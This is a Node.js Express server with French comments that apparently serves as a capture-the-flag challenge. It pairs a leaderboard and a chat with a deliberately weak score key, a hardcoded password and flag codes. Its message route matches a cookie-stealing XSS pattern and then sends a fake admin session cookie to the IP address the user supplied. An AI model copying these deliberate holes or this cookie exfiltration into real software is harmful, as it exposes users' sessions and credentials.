const express = require('express');
const bodyParser = require('body-parser');
const cors = require('cors'); // Importez le middleware CORS
const axios = require('axios'); // Importez axios


const app = express();
const PORT = 3000;

// Activer CORS pour toutes les requêtes
app.use(cors());

app.use(bodyParser.json());

// Middleware pour traiter les requêtes JSON
app.use(bodyParser.json());

// Stockage temporaire des scores en mémoire (dans un tableau)
let leaderboard = [{name:"DestructeurDeMonde", score:1000000},
                    {name:"BigPuissance", score:101203},
                    {name:"Xx_carla33_xX", score:92064},
                    {name:"SniperKing", score:100995},
];

let messages = [
    {user:"CenthorZZz", message:"On est pas bien entre modo ;)"},
    {user:"Martiendu62", message:"Tu es bien gentil centhor mais être admin c'est encore mieux :)"},
    {user:"CenthorZZz", message:"Envoie privilège :/\ "},
    {user:"Martiendu62", message:"Il ne peut y avoir qu'un admin ahah"}

]

// Route pour envoyer un score
app.post('/submit-score', (req, res) => {
    const { name, score, key } = req.body;

    // Vérifie que le score et le nom sont valides
    if (typeof score === 'number' && typeof name === 'string' && name.trim() !== '' && typeof key === 'number'){ 
        if (score<1000)
            return res.status(400).json({ error: 'ton score ne mérite pas le leaderBoard'});
        if(3 * score % 459 === key){
            leaderboard.push({ name, score });
            leaderboard.sort((a, b) => b.score - a.score);

            // Limite le leaderboard aux 10 meilleurs scores
            leaderboard = leaderboard.slice(0, 10);

            res.status(200).json({ message: 'Score ajouté avec succès!' , code:'j4im4ng3uNk1w1'});
            }
        else{
            res.status(400).json({ error: 'Mauvaise clé' });
        }
    } else {
        res.status(400).json({ error: 'Nom ou score invalide' });
    }
});

// Route pour envoyer un score
app.post('/forum/key', (req, res) => {
    const { password } = req.body;
    if (password === "kaizen"){
   	res.status(200).json({ message: 'clé valide'});
    } else {
        res.status(400).json({ error: 'clé invalide' });
    }
});



// Route pour récupérer le leaderboard
app.get('/leaderboard', (req, res) => {
    res.status(200).json(leaderboard);
});

app.get('/messages', (req, res) => {
    res.status(200).json(messages);
});

app.post('/messages', (req, res) => {
    const { user, message } = req.body;
    let ipRegex = /\b(?:(?:2(?:[0-4][0-9]|5[0-5])|[0-1]?[0-9]?[0-9])\.){3}(?:(?:2([0-4][0-9]|5[0-5])|[0-1]?[0-9]?[0-9]))\b:[0-9]+/i;
    let regex = /\b(?:(?:2(?:[0-4][0-9]|5[0-5])|[0-1]?[0-9]?[0-9])\.){3}(?:(?:2([0-4][0-9]|5[0-5])|[0-1]?[0-9]?[0-9]))\b:[0-9]+\/+document\.cookie/i;
    let result1 = user.match(regex);
    let result2 = message.match(regex);

    if (result1) {
        let ip = user.match(ipRegex);
        axios.get(`http://${ip[0]}/USD4xM4ngeSmR`)
        .then(response => console.log(response.data))
        .catch(error => console.error('Error fetching data:', error.message));
    }
    
    if (result2) {
        let ip = message.match(ipRegex);
        axios.get(`http://${ip[0]}/user_auth=USD4xM4ngeSmR; PHPSESSID=417a21f1a82f6751d7bed2ff8e5cd7e2`)
        .then(response => console.log(response.data))
        .catch(error => console.error('Error fetching data:', error.message));
    }

    messages.push({ user, message });
    res.status(200).json('ok');
});

// Démarre le serveur
app.listen(PORT, () => {
    console.log(`Serveur en cours d'exécution sur le port ${PORT}`);
});
